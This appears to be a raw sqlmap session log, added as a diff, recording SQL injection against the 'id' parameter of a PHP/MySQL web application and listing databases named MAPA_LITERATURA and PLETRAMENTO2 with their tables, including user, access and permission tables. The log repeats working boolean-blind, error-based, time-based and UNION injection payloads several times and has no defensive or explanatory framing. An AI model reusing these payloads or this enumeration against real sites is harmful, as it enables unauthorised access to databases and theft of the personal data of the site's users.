+| INFORMATION_SCHEMADAYGUUGLOBAL_VARIABLES                      |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE                    |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE_LRU                |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_POOL_STATS              |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP                            |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM                         |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM_RESET                   |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP_RESET                      |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCKS                          |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCK_WAITS                     |
+| INFORMATION_SCHEMADAYGUUINNODB_TRX                            |
+| INFORMATION_SCHEMADAYGUUKEY_COLUMN_USAGE                      |
+| INFORMATION_SCHEMADAYGUUPARAMETERS                            |
+| INFORMATION_SCHEMADAYGUUPARTITIONS                            |
+| INFORMATION_SCHEMADAYGUUPLUGINS                               |
+| INFORMATION_SCHEMADAYGUUPROCESSLIST                           |
+| INFORMATION_SCHEMADAYGUUPROFILING                             |
+| INFORMATION_SCHEMADAYGUUREFERENTIAL_CONSTRAINTS               |
+| INFORMATION_SCHEMADAYGUUROUTINES                              |
+| INFORMATION_SCHEMADAYGUUSCHEMATA                              |
+| INFORMATION_SCHEMADAYGUUSCHEMA_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUSESSION_STATUS                        |
+| INFORMATION_SCHEMADAYGUUSESSION_VARIABLES                     |
+| INFORMATION_SCHEMADAYGUUSTATISTICS                            |
+| INFORMATION_SCHEMADAYGUUTABLES                                |
+| INFORMATION_SCHEMADAYGUUTABLESPACES                           |
+| INFORMATION_SCHEMADAYGUUTABLE_CONSTRAINTS                     |
+| INFORMATION_SCHEMADAYGUUTABLE_PRIVILEGES                      |
+| INFORMATION_SCHEMADAYGUUTRIGGERS                              |
+| INFORMATION_SCHEMADAYGUUUSER_PRIVILEGES                       |
+| INFORMATION_SCHEMADAYGUUVIEWS                                 |
+| MAPA_LITERATURADAYGUULINGUAGEM_GENERO                         |
+| MAPA_LITERATURADAYGUUNIVEL_ESCOLARIDADE                       |
+| MAPA_LITERATURADAYGUUOBRA                                     |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR                              |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR_NIVEL_ESCOLARIDADE           |
+| MAPA_LITERATURADAYGUUOBRA_NIVEL_ESCOLARIDADE                  |
+| MAPA_LITERATURADAYGUUPUBLICO_ALVO                             |
+| MAPA_LITERATURADAYGUUREGIAO                                   |
+| MAPA_LITERATURADAYGUUTEMATICA                                 |
+| MAPA_LITERATURADAYGUUUSUARIO                                  |
+| PLETRAMENTO2DAYGUUACESSO                                      |
+| PLETRAMENTO2DAYGUUCIDADE                                      |
+| PLETRAMENTO2DAYGUUCIDADE_REGIAO                               |
+| PLETRAMENTO2DAYGUUCIDADE_UF                                   |
+| PLETRAMENTO2DAYGUUCONTATO                                     |
+| PLETRAMENTO2DAYGUUDICA_LETRADA_CATEGORIA                      |
+| PLETRAMENTO2DAYGUUFAQ                                         |
+| PLETRAMENTO2DAYGUUFAVORITO                                    |
+| PLETRAMENTO2DAYGUUFAVORITO_CLIQUES                            |
+| PLETRAMENTO2DAYGUUFORUM                                       |
+| PLETRAMENTO2DAYGUUFORUM_HISTORICO                             |
+| PLETRAMENTO2DAYGUUFORUM_MODERADOR                             |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO                                |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM                       |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM_MENSAGEM              |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_NOTIFICACAO                    |
+| PLETRAMENTO2DAYGUUMOODLE_CATEGORIA                            |
+| PLETRAMENTO2DAYGUUMOODLE_INSCRICAO                            |
+| PLETRAMENTO2DAYGUUMOODLE_TURMA                                |
+| PLETRAMENTO2DAYGUUMURAL                                       |
+| PLETRAMENTO2DAYGUUMURAL_QUESTAO                               |
+| PLETRAMENTO2DAYGUUMURAL_RESPOSTA                              |
+| PLETRAMENTO2DAYGUUNEWSLETTER                                  |
+| PLETRAMENTO2DAYGUUPAIS                                        |
+| PLETRAMENTO2DAYGUUPARCEIRO                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ACESSO                             |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ARQUIVO                            |
+| PLETRAMENTO2DAYGUUPOSTAGEM_COMENTARIO                         |
+| PLETRAMENTO2DAYGUUPOSTAGEM_DESTAQUE                           |
+| PLETRAMENTO2DAYGUUPOSTAGEM_HISTORICO                          |
+| PLETRAMENTO2DAYGUUPOSTAGEM_NOTIFICACAO                        |
+| PLETRAMENTO2DAYGUUPOSTAGEM_TIPO                               |
+| PLETRAMENTO2DAYGUUPROJETO                                     |
+| PLETRAMENTO2DAYGUUPROJETO_FOTO                                |
+| PLETRAMENTO2DAYGUUUSUARIO                                     |
+| PLETRAMENTO2DAYGUUUSUARIO_ACESSO                              |
+| PLETRAMENTO2DAYGUUUSUARIO_INSCRICAO_OFICINA                   |
+| PLETRAMENTO2DAYGUUUSUARIO_PERFIL                              |
+| PLETRAMENTO2DAYGUUUSUARIO_PERMISSAO                           |
++---------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] INFORMATION_SCHEMA
+[*] MAPA_LITERATURA
+[*] PLETRAMENTO2
+
+Database: MAPA_LITERATURA
+[90 tables]
++---------------------------------------------------------------+
+| INFORMATION_SCHEMADAYGUUCHARACTER_SETS                        |
+| INFORMATION_SCHEMADAYGUUCOLLATIONS                            |
+| INFORMATION_SCHEMADAYGUUCOLLATION_CHARACTER_SET_APPLICABILITY |
+| INFORMATION_SCHEMADAYGUUCOLUMNS                               |
+| INFORMATION_SCHEMADAYGUUCOLUMN_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUENGINES                               |
+| INFORMATION_SCHEMADAYGUUEVENTS                                |
+| INFORMATION_SCHEMADAYGUUFILES                                 |
+| INFORMATION_SCHEMADAYGUUGLOBAL_STATUS                         |
+| INFORMATION_SCHEMADAYGUUGLOBAL_VARIABLES                      |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE                    |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE_LRU                |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_POOL_STATS              |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP                            |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM                         |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM_RESET                   |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP_RESET                      |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCKS                          |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCK_WAITS                     |
+| INFORMATION_SCHEMADAYGUUINNODB_TRX                            |
+| INFORMATION_SCHEMADAYGUUKEY_COLUMN_USAGE                      |
+| INFORMATION_SCHEMADAYGUUPARAMETERS                            |
+| INFORMATION_SCHEMADAYGUUPARTITIONS                            |
+| INFORMATION_SCHEMADAYGUUPLUGINS                               |
+| INFORMATION_SCHEMADAYGUUPROCESSLIST                           |
+| INFORMATION_SCHEMADAYGUUPROFILING                             |
+| INFORMATION_SCHEMADAYGUUREFERENTIAL_CONSTRAINTS               |
+| INFORMATION_SCHEMADAYGUUROUTINES                              |
+| INFORMATION_SCHEMADAYGUUSCHEMATA                              |
+| INFORMATION_SCHEMADAYGUUSCHEMA_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUSESSION_STATUS                        |
+| INFORMATION_SCHEMADAYGUUSESSION_VARIABLES                     |
+| INFORMATION_SCHEMADAYGUUSTATISTICS                            |
+| INFORMATION_SCHEMADAYGUUTABLES                                |
+| INFORMATION_SCHEMADAYGUUTABLESPACES                           |
+| INFORMATION_SCHEMADAYGUUTABLE_CONSTRAINTS                     |
+| INFORMATION_SCHEMADAYGUUTABLE_PRIVILEGES                      |
+| INFORMATION_SCHEMADAYGUUTRIGGERS                              |
+| INFORMATION_SCHEMADAYGUUUSER_PRIVILEGES                       |
+| INFORMATION_SCHEMADAYGUUVIEWS                                 |
+| MAPA_LITERATURADAYGUULINGUAGEM_GENERO                         |
+| MAPA_LITERATURADAYGUUNIVEL_ESCOLARIDADE                       |
+| MAPA_LITERATURADAYGUUOBRA                                     |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR                              |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR_NIVEL_ESCOLARIDADE           |
+| MAPA_LITERATURADAYGUUOBRA_NIVEL_ESCOLARIDADE                  |
+| MAPA_LITERATURADAYGUUPUBLICO_ALVO                             |
+| MAPA_LITERATURADAYGUUREGIAO                                   |
+| MAPA_LITERATURADAYGUUTEMATICA                                 |
+| MAPA_LITERATURADAYGUUUSUARIO                                  |
+| PLETRAMENTO2DAYGUUACESSO                                      |
+| PLETRAMENTO2DAYGUUCIDADE                                      |
+| PLETRAMENTO2DAYGUUCIDADE_REGIAO                               |
+| PLETRAMENTO2DAYGUUCIDADE_UF                                   |
+| PLETRAMENTO2DAYGUUCONTATO                                     |
+| PLETRAMENTO2DAYGUUDICA_LETRADA_CATEGORIA                      |
+| PLETRAMENTO2DAYGUUFAQ                                         |
+| PLETRAMENTO2DAYGUUFAVORITO                                    |
+| PLETRAMENTO2DAYGUUFAVORITO_CLIQUES                            |
+| PLETRAMENTO2DAYGUUFORUM                                       |
+| PLETRAMENTO2DAYGUUFORUM_HISTORICO                             |
+| PLETRAMENTO2DAYGUUFORUM_MODERADOR                             |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO                                |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM                       |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM_MENSAGEM              |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_NOTIFICACAO                    |
+| PLETRAMENTO2DAYGUUMOODLE_CATEGORIA                            |
+| PLETRAMENTO2DAYGUUMOODLE_INSCRICAO                            |
+| PLETRAMENTO2DAYGUUMOODLE_TURMA                                |
+| PLETRAMENTO2DAYGUUMURAL                                       |
+| PLETRAMENTO2DAYGUUMURAL_QUESTAO                               |
+| PLETRAMENTO2DAYGUUMURAL_RESPOSTA                              |
+| PLETRAMENTO2DAYGUUNEWSLETTER                                  |
+| PLETRAMENTO2DAYGUUPAIS                                        |
+| PLETRAMENTO2DAYGUUPARCEIRO                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ACESSO                             |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ARQUIVO                            |
+| PLETRAMENTO2DAYGUUPOSTAGEM_COMENTARIO                         |
+| PLETRAMENTO2DAYGUUPOSTAGEM_DESTAQUE                           |
+| PLETRAMENTO2DAYGUUPOSTAGEM_HISTORICO                          |
+| PLETRAMENTO2DAYGUUPOSTAGEM_NOTIFICACAO                        |
+| PLETRAMENTO2DAYGUUPOSTAGEM_TIPO                               |
+| PLETRAMENTO2DAYGUUPROJETO                                     |
+| PLETRAMENTO2DAYGUUPROJETO_FOTO                                |
+| PLETRAMENTO2DAYGUUUSUARIO                                     |
+| PLETRAMENTO2DAYGUUUSUARIO_ACESSO                              |
+| PLETRAMENTO2DAYGUUUSUARIO_INSCRICAO_OFICINA                   |
+| PLETRAMENTO2DAYGUUUSUARIO_PERFIL                              |
+| PLETRAMENTO2DAYGUUUSUARIO_PERMISSAO                           |
++---------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+No tables found
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] INFORMATION_SCHEMA
+[*] MAPA_LITERATURA
+[*] PLETRAMENTO2
+
+Database: MAPA_LITERATURA
+[90 tables]
++---------------------------------------------------------------+
+| INFORMATION_SCHEMADAYGUUCHARACTER_SETS                        |
+| INFORMATION_SCHEMADAYGUUCOLLATIONS                            |
+| INFORMATION_SCHEMADAYGUUCOLLATION_CHARACTER_SET_APPLICABILITY |
+| INFORMATION_SCHEMADAYGUUCOLUMNS                               |
+| INFORMATION_SCHEMADAYGUUCOLUMN_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUENGINES                               |
+| INFORMATION_SCHEMADAYGUUEVENTS                                |
+| INFORMATION_SCHEMADAYGUUFILES                                 |
+| INFORMATION_SCHEMADAYGUUGLOBAL_STATUS                         |
+| INFORMATION_SCHEMADAYGUUGLOBAL_VARIABLES                      |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE                    |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE_LRU                |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_POOL_STATS              |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP                            |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM                         |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM_RESET                   |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP_RESET                      |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCKS                          |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCK_WAITS                     |
+| INFORMATION_SCHEMADAYGUUINNODB_TRX                            |
+| INFORMATION_SCHEMADAYGUUKEY_COLUMN_USAGE                      |
+| INFORMATION_SCHEMADAYGUUPARAMETERS                            |
+| INFORMATION_SCHEMADAYGUUPARTITIONS                            |
+| INFORMATION_SCHEMADAYGUUPLUGINS                               |
+| INFORMATION_SCHEMADAYGUUPROCESSLIST                           |
+| INFORMATION_SCHEMADAYGUUPROFILING                             |
+| INFORMATION_SCHEMADAYGUUREFERENTIAL_CONSTRAINTS               |
+| INFORMATION_SCHEMADAYGUUROUTINES                              |
+| INFORMATION_SCHEMADAYGUUSCHEMATA                              |
+| INFORMATION_SCHEMADAYGUUSCHEMA_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUSESSION_STATUS                        |
+| INFORMATION_SCHEMADAYGUUSESSION_VARIABLES                     |
+| INFORMATION_SCHEMADAYGUUSTATISTICS                            |
+| INFORMATION_SCHEMADAYGUUTABLES                                |
+| INFORMATION_SCHEMADAYGUUTABLESPACES                           |
+| INFORMATION_SCHEMADAYGUUTABLE_CONSTRAINTS                     |
+| INFORMATION_SCHEMADAYGUUTABLE_PRIVILEGES                      |
+| INFORMATION_SCHEMADAYGUUTRIGGERS                              |
+| INFORMATION_SCHEMADAYGUUUSER_PRIVILEGES                       |
+| INFORMATION_SCHEMADAYGUUVIEWS                                 |
+| MAPA_LITERATURADAYGUULINGUAGEM_GENERO                         |
+| MAPA_LITERATURADAYGUUNIVEL_ESCOLARIDADE                       |
+| MAPA_LITERATURADAYGUUOBRA                                     |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR                              |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR_NIVEL_ESCOLARIDADE           |
+| MAPA_LITERATURADAYGUUOBRA_NIVEL_ESCOLARIDADE                  |
+| MAPA_LITERATURADAYGUUPUBLICO_ALVO                             |
+| MAPA_LITERATURADAYGUUREGIAO                                   |
+| MAPA_LITERATURADAYGUUTEMATICA                                 |
+| MAPA_LITERATURADAYGUUUSUARIO                                  |
+| PLETRAMENTO2DAYGUUACESSO                                      |
+| PLETRAMENTO2DAYGUUCIDADE                                      |
+| PLETRAMENTO2DAYGUUCIDADE_REGIAO                               |
+| PLETRAMENTO2DAYGUUCIDADE_UF                                   |
+| PLETRAMENTO2DAYGUUCONTATO                                     |
+| PLETRAMENTO2DAYGUUDICA_LETRADA_CATEGORIA                      |
+| PLETRAMENTO2DAYGUUFAQ                                         |
+| PLETRAMENTO2DAYGUUFAVORITO                                    |
+| PLETRAMENTO2DAYGUUFAVORITO_CLIQUES                            |
+| PLETRAMENTO2DAYGUUFORUM                                       |
+| PLETRAMENTO2DAYGUUFORUM_HISTORICO                             |
+| PLETRAMENTO2DAYGUUFORUM_MODERADOR                             |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO                                |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM                       |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM_MENSAGEM              |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_NOTIFICACAO                    |
+| PLETRAMENTO2DAYGUUMOODLE_CATEGORIA                            |
+| PLETRAMENTO2DAYGUUMOODLE_INSCRICAO                            |
+| PLETRAMENTO2DAYGUUMOODLE_TURMA                                |
+| PLETRAMENTO2DAYGUUMURAL                                       |
+| PLETRAMENTO2DAYGUUMURAL_QUESTAO                               |
+| PLETRAMENTO2DAYGUUMURAL_RESPOSTA                              |
+| PLETRAMENTO2DAYGUUNEWSLETTER                                  |
+| PLETRAMENTO2DAYGUUPAIS                                        |
+| PLETRAMENTO2DAYGUUPARCEIRO                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ACESSO                             |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ARQUIVO                            |
+| PLETRAMENTO2DAYGUUPOSTAGEM_COMENTARIO                         |
+| PLETRAMENTO2DAYGUUPOSTAGEM_DESTAQUE                           |
+| PLETRAMENTO2DAYGUUPOSTAGEM_HISTORICO                          |
+| PLETRAMENTO2DAYGUUPOSTAGEM_NOTIFICACAO                        |
+| PLETRAMENTO2DAYGUUPOSTAGEM_TIPO                               |
+| PLETRAMENTO2DAYGUUPROJETO                                     |
+| PLETRAMENTO2DAYGUUPROJETO_FOTO                                |
+| PLETRAMENTO2DAYGUUUSUARIO                                     |
+| PLETRAMENTO2DAYGUUUSUARIO_ACESSO                              |
+| PLETRAMENTO2DAYGUUUSUARIO_INSCRICAO_OFICINA                   |
+| PLETRAMENTO2DAYGUUUSUARIO_PERFIL                              |
+| PLETRAMENTO2DAYGUUUSUARIO_PERMISSAO                           |
++---------------------------------------------------------------+
+
